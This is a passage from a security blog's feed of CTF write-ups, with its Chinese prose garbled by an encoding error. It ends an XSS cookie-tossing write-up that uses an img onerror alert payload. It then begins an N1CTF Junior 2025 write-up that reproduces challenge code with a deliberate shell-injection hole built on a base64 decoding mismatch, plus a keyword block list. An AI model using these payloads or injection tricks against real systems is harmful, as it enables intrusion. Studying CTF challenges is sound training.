class="token punctuation">.</span><span class="token function">fromCodePoint</span><span class="token punctuation">(</span><span class="token number">0x2000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">__Host-name=&lt;img src=x onerror=alert(1)>; Domain=example.com; Path=/;</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æµè§ˆå™¨å‘é€çš„æ ‡å¤´</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">__Host-name=Carlos; Ã¢â‚¬â‚¬__Host-name=&lt;img src=x onerror=alert(1)>;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åç«¯å¾€å¾€ä¼šæŠŠåŒåæœ€åå‡ºç°çš„ä¸€ä¸ªå€¼ä½œä¸ºå¯¹åº” cookie çš„å€¼ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±æ˜¯æˆ‘ä»¬çš„ payload</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å…³äºè¿™ä¸ªçš„æ€»ç»“å¥½åƒä¸æ˜¯ç‰¹åˆ«å¤šï¼Œååå›½å¤–èµ›ä»¥åŠä¸€äº›è”åˆæˆ˜é˜Ÿçš„æ¯”èµ›ä¹Ÿçˆ±å‡ºè¿™ä¸ªï¼ˆ&lt;/p&gt;
&lt;p&gt;é‚æ•´ç†ä¸€ç‚¹ä¸œè¥¿å‡ºæ¥&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="XSS" scheme="http://c1oudfl0w0.github.io/blog/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF Junior 2025 2/2</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/09/13/N1CTF-Junior-2025-2-2/</id>
    <published>2025-09-13T02:10:32.000Z</published>
    <updated>2025-11-28T02:53:39.619Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‚è€ƒï¼š</p><p>ZianTT çš„ wpï¼š <a href="https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA">https://mp.weixin.qq.com/s/NtgULOY4uKJ5MT3L5WLcqA</a></p><p>A5rZ çš„ wpï¼š <a href="https://blog.csdn.net/weixin_59166557/article/details/151723712">https://blog.csdn.net/weixin_59166557/article/details/151723712</a></p><p>Sh_eePppp çš„ wpï¼š <a href="https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes">https://sheep-sys-sudo.github.io/n1CTF-web-WP/#safenotes</a></p><span id="more"></span><hr><h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> subprocess<span class="token keyword">import</span> re<span class="token keyword">import</span> ipaddress<span class="token keyword">import</span> flask<span class="token keyword">def</span> <span class="token function">run_ping</span><span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        decoded_ip <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^\d+\.\d+\.\d+\.\d+$'</span><span class="token punctuation">,</span> decoded_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> decoded_ip<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">256</span> <span class="token keyword">for</span> part <span class="token keyword">in</span> decoded_ip<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ipaddress<span class="token punctuation">.</span>ip_address<span class="token punctuation">(</span>decoded_ip<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>decoded_ip<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">15</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'^[A-Za-z0-9+/=]+$'</span><span class="token punctuation">,</span> ip_base64<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"""echo "ping -c 1 $(echo '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ip_base64<span class="token punctuation">&#125;</span></span><span class="token string">' | base64 -d)" | sh"""</span></span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        process <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>            command<span class="token punctuation">,</span>            shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            check<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            capture_output<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>            text<span class="token operator">=</span><span class="token boolean">True</span>        <span class="token punctuation">)</span>        <span class="token keyword">return</span> process<span class="token punctuation">.</span>stdout    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ping'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>json    ip_base64 <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'ip_base64'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> ip_base64<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'error'</span><span class="token punctuation">:</span> <span class="token string">'no ip'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span>    result <span class="token operator">=</span> run_ping<span class="token punctuation">(</span>ip_base64<span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'success'</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'output'</span><span class="token punctuation">:</span> result<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">'success'</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çœ‹ä¸€ä¸‹é™åˆ¶ï¼š</p><ul><li>è§£ç åçš„ ip å¿…é¡»æ˜¯ <code>x.x.x.x</code> å½¢å¼</li><li><code>.</code> å¿…é¡»ä¸ºä¸‰ä¸ª</li><li>ä»¥ <code>.</code> åˆ†éš”çš„æ¯éƒ¨åˆ†å¿…é¡»èƒ½ int è½¬åŒ–ä¸º 0 åˆ° 256 çš„æ•°</li><li>æ»¡è¶³ ipv4 æˆ–è€… ipv6</li><li>ip é•¿åº¦ä¸èƒ½è¶…è¿‡ 15</li></ul><p>å‘½ä»¤æ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"ping -c 1 <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">''</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span class="token variable">)</span></span>"</span> <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çŒœæµ‹å’Œ <code>b64decode</code> ä¸ <code>base64 -d</code> çš„å·®å¼‚æœ‰å…³</p><p>æ‰¾åˆ°ä¸€ä¸ª b64decode çš„ bugï¼š<a href="https://bugs.python.org/issue34832">https://bugs.python.org/issue34832</a></p><p>è€ŒåŒæ ·çš„å†…å®¹åœ¨ <code>base64 -d</code> ä¸Šå¯ä»¥æ­£å¸¸è§£ç ï¼Œé‚£ä¹ˆæ„é€ å‘½ä»¤æ‰§è¡Œå³å¯</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914004748284.png"></p><hr><h1 id="Peek-a-Fork"><a href="#Peek-a-Fork" class="headerlink" title="Peek a Fork"></a>Peek a Fork</h1><p>&#x2F;entrypoint.sh</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/sh</span><span class="token builtin">set</span> <span class="token operator">-</span>eecho <span class="token string">"$FLAG"</span> <span class="token operator">></span> <span class="token operator">/</span>app<span class="token operator">/</span>flag<span class="token punctuation">.</span>txtunset FLAG<span class="token keyword">exec</span> python <span class="token operator">/</span>app<span class="token operator">/</span>server<span class="token punctuation">.</span>py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag å°±åœ¨å½“å‰ç›®å½•ä¸‹ flag.txtï¼Œä½†æ˜¯è¦ç»•è¿‡ 403 waf</p><p>fuzz ä¸€ä¸‹å‘ç° ban äº† <code>&#39;</code>ã€<code>&gt;</code> ã€<code>&lt;</code>ã€<code>&quot;</code>ã€<code>^</code>ã€<code>./</code> ã€<code>..</code>ã€<code>flag</code></p><p>åé¢å‘ç°ç»™äº†æºç </p><p>server.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> os<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> fcntl<span class="token keyword">import</span> re<span class="token keyword">import</span> mmap<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    flag <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>mm <span class="token operator">=</span> mmap<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span>mm<span class="token punctuation">.</span>write<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">'flag.txt'</span><span class="token punctuation">)</span>FORBIDDEN <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'flag'</span><span class="token punctuation">,</span> <span class="token string">b'proc'</span><span class="token punctuation">,</span> <span class="token string">b'&lt;'</span><span class="token punctuation">,</span> <span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'^'</span><span class="token punctuation">,</span> <span class="token string">b"'"</span><span class="token punctuation">,</span> <span class="token string">b'"'</span><span class="token punctuation">,</span> <span class="token string">b'..'</span><span class="token punctuation">,</span> <span class="token string">b'./'</span><span class="token punctuation">]</span>PAGE <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE html>&lt;html lang="en">&lt;head>    &lt;meta charset="UTF-8">    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0">    &lt;title>Secure Gateway&lt;/title>    &lt;style>        body &#123; font-family: 'Courier New', monospace; background-color: #0c0c0c; color: #00ff00; text-align: center; margin-top: 10%; &#125;        .container &#123; border: 1px solid #00ff00; padding: 2rem; display: inline-block; &#125;        h1 &#123; font-size: 2.5rem; text-shadow: 0 0 5px #00ff00; &#125;        p &#123; font-size: 1.2rem; &#125;        .status &#123; color: #ffff00; &#125;    &lt;/style>&lt;/head>&lt;body>    &lt;div class="container">        &lt;h1>Firewall&lt;/h1>        &lt;p class="status">STATUS: All systems operational.&lt;/p>        &lt;p>Your connection has been inspected.&lt;/p>    &lt;/div>&lt;/body>&lt;/html>"""</span><span class="token keyword">def</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> log<span class="token punctuation">,</span> factor<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> log<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                fcntl<span class="token punctuation">.</span>flock<span class="token punctuation">(</span>f<span class="token punctuation">,</span> fcntl<span class="token punctuation">.</span>LOCK_EX<span class="token punctuation">)</span>                log_bytes <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">:</span>                    log_bytes <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha3_256<span class="token punctuation">(</span>log_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>                log_entry <span class="token operator">=</span> log_bytes<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_entry<span class="token punctuation">)</span>                        request_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> request_data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b"GET /"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request"</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            path <span class="token operator">=</span> request_data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            pattern <span class="token operator">=</span> <span class="token string">rb'\?offset=(\d+)&amp;length=(\d+)'</span>                        offset <span class="token operator">=</span> <span class="token number">0</span>            length <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> path<span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                length <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                                clean_path <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>                filename <span class="token operator">=</span> clean_path<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                filename <span class="token operator">=</span> path<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">b'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>            response <span class="token operator">=</span> <span class="token string">b"HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request"</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> filename<span class="token punctuation">:</span>            response_body <span class="token operator">=</span> PAGE            response_status <span class="token operator">=</span> <span class="token string">"200 OK"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>normpath<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                    <span class="token keyword">if</span> offset <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>                        f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>                                        data_bytes <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span>length<span class="token punctuation">)</span>                    response_body <span class="token operator">=</span> data_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'ignore'</span><span class="token punctuation">)</span>                response_status <span class="token operator">=</span> <span class="token string">"200 OK"</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                response_body <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Invalid path"</span></span>                response_status <span class="token operator">=</span> <span class="token string">"500 Internal Server Error"</span>        response <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"HTTP/1.1 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>response_status<span class="token punctuation">&#125;</span></span><span class="token string">\r\nContent-Length: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>response_body<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n\r\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>response_body<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>response<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Server listening on port 1337..."</span></span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            pid<span class="token punctuation">,</span> status <span class="token operator">=</span> os<span class="token punctuation">.</span>waitpid<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>WNOHANG<span class="token punctuation">)</span>        <span class="token keyword">except</span> ChildProcessError<span class="token punctuation">:</span>            <span class="token keyword">pass</span>        conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        initial_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>MSG_PEEK<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>term <span class="token keyword">in</span> initial_data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> term <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">:</span>            conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected."</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span>                    <span class="token keyword">if</span> initial_data<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'GET /?log=1'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                factor <span class="token operator">=</span> <span class="token number">1</span>                pattern <span class="token operator">=</span> <span class="token string">rb"&amp;factor=(\d+)"</span>                <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> initial_data<span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>                    factor <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                    server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                    handle_connection<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> factor<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ERROR]: "</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>            <span class="token keyword">finally</span><span class="token punctuation">:</span>                conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            pid <span class="token operator">=</span> os<span class="token punctuation">.</span>fork<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                handle_connection<span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>                conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span>